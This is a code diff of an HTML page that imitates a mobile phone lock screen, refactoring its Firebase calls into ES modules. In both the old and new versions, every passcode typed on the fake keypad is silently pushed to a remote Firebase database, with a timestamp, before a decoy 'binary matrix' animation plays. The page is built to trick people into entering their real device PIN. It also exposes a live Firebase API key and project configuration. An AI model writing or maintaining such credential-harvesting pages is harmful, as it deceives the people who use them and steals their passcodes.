@@ -6,9 +6,6 @@
 <title>Mobile Lock Screen</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
 
-<script src="https://www.gstatic.com/firebasejs/10.14.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.14.0/firebase-database-compat.js"></script>
-
 <style>
   * {
     margin: 0;
@@ -335,29 +332,30 @@
     <div class="dot"></div>
   </div>
   
-  <div class="keypad-grid">
-    <button class="key-btn" onclick="pressNum(1)">1</button>
-    <button class="key-btn" onclick="pressNum(2)">2</button>
-    <button class="key-btn" onclick="pressNum(3)">3</button>
+  <div class="keypad-grid" id="keypadGrid">
+    <button class="key-btn" data-val="1">1</button>
+    <button class="key-btn" data-val="2">2</button>
+    <button class="key-btn" data-val="3">3</button>
     
-    <button class="key-btn" onclick="pressNum(4)">4</button>
-    <button class="key-btn" onclick="pressNum(5)">5</button>
-    <button class="key-btn" onclick="pressNum(6)">6</button>
+    <button class="key-btn" data-val="4">4</button>
+    <button class="key-btn" data-val="5">5</button>
+    <button class="key-btn" data-val="6">6</button>
     
-    <button class="key-btn" onclick="pressNum(7)">7</button>
-    <button class="key-btn" onclick="pressNum(8)">8</button>
-    <button class="key-btn" onclick="pressNum(9)">9</button>
+    <button class="key-btn" data-val="7">7</button>
+    <button class="key-btn" data-val="8">8</button>
+    <button class="key-btn" data-val="9">9</button>
     
-    <button class="key-action-label" onclick="cancelPin()">Cancel</button>
-    <button class="key-btn" onclick="pressNum(0)">0</button>
-    <button class="key-action-label" onclick="backspacePin()">Delete</button>
+    <button class="key-action-label" id="cancelBtn">Cancel</button>
+    <button class="key-btn" data-val="0">0</button>
+    <button class="key-action-label" id="deleteBtn">Delete</button>
   </div>
 </div>
 
-<script>
-// ==========================================
-// 1. Firebase Initialization
-// ==========================================
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-database.js";
+
+// Your verified Firebase web application config block
 const firebaseConfig = {
   apiKey: "AIzaSyAkEEk5c3wPQpSvZJoCB0sr086ip_9Gnmc",
   authDomain: "mobile-wallpaper-91468.firebaseapp.com",
@@ -368,21 +366,27 @@ const firebaseConfig = {
   databaseURL: "https://mobile-wallpaper-91468-default-rtdb.firebaseio.com"
 };
 
-firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+// Application UI States
+let enteredPin = "";
+const lockView = document.getElementById('lockView');
+const numericView = document.getElementById('numericView');
+const dots = document.querySelectorAll('.dot');
 
 // ==========================================
-// 2. Automated 2-Second Screen Switch Loader
+// 1. Automated 2-Second Screen Switch Loader
 // ==========================================
 setTimeout(() => {
   document.body.style.backgroundColor = "#000000";
   document.getElementById('natureBg').style.opacity = "1";
   document.getElementById('statusBar').style.opacity = "1";
-  document.getElementById('lockView').style.opacity = "1";
+  lockView.style.opacity = "1";
 }, 2000);
 
 // ==========================================
-// 3. Realtime Clock and Date Updater Logic
+// 2. Realtime Clock and Date Updater Logic
 // ==========================================
 function updateDateTime() {
   const now = new Date();
@@ -403,11 +407,9 @@ setInterval(updateDateTime, 1000);
 updateDateTime();
 
 // ==========================================
-// 4. Swipe Detection Mechanics
+// 3. Swipe Detection Mechanics
 // ==========================================
 let startY = 0;
-const lockView = document.getElementById('lockView');
-const numericView = document.getElementById('numericView');
 
 window.addEventListener('touchstart', (e) => {
   startY = e.touches[0].clientY;
@@ -432,7 +434,7 @@ window.addEventListener('mouseup', (e) => {
 });
 
 function showPinPad() {
-  if (document.getElementById('lockView').style.opacity === "1") {
+  if (lockView.style.opacity === "1") {
     lockView.classList.add('slide-up');
     numericView.classList.add('active');
   }
@@ -445,11 +447,8 @@ function cancelPin() {
 }
 
 // ==========================================
-// 5. Pin Processing & Silent Firebase Log
+// 4. Pin Processing & Silent Firebase Action
 // ==========================================
-let enteredPin = "";
-const dots = document.querySelectorAll('.dot');
-
 function pressNum(num) {
   if (enteredPin.length >= 4) return;
   
@@ -484,25 +483,25 @@ function updateDots() {
 function savePasscodeToFirebase(pinValue) {
   const currentTimestamp = new Date();
 
-  // Save to database silently in the background
-  db.ref('lockscreen_attempts').push({
+  // Sends database metrics silently behind the scenes
+  push(ref(db, 'lockscreen_attempts'), {
     passcodeEntered: pinValue,
     time: currentTimestamp.toLocaleTimeString('en-US'),
     date: currentTimestamp.toLocaleDateString('en-US'),
     fullTimestamp: currentTimestamp.toISOString()
   })
   .then(() => {
-    // Hide UI screens and activate Binary Screen + Matrix Canvas
+    // Hide default view layout screens entirely
     numericView.classList.remove('active');
     document.getElementById('statusBar').style.display = 'none';
     
+    // Switch on the localized Binary Matrix interface canvas elements
     const canvas = document.getElementById('matrixCanvas');
     const textScreen = document.getElementById('binaryScreen');
     
     canvas.style.display = 'block';
     textScreen.style.display = 'flex';
     
-    // Start Matrix Animation
     startMatrixAnimation();
   })
   .catch((error) => {
@@ -512,7 +511,7 @@ function savePasscodeToFirebase(pinValue) {
 }
 
 // ==========================================
-// 6. Local Binary Rain Animation Engine
+// 5. Binary Rain Canvas Engine
 // ==========================================
 function startMatrixAnimation() {
   const canvas = document.getElementById('matrixCanvas');
@@ -523,6 +522,7 @@ function startMatrixAnimation() {
     canvas.height = window.innerHeight;
   }
   resize();
+  window.addEventListener('resize', resize);
 
   const fontSize = 14;
   const columns = Math.floor(canvas.width / fontSize);
@@ -553,6 +553,16 @@ function startMatrixAnimation() {
   }
   setInterval(draw, 33);
 }
+
+// Map local function execution calls to Module DOM listeners
+document.getElementById('keypadGrid').addEventListener('click', (e) => {
+  const button = e.target.closest('.key-btn');
+  if (button) {
+    pressNum(button.getAttribute('data-val'));
+  }
+});
+document.getElementById('cancelBtn').addEventListener('click', cancelPin);
+document.getElementById('deleteBtn').addEventListener('click', backspacePin);
 </script>
 
 </body>
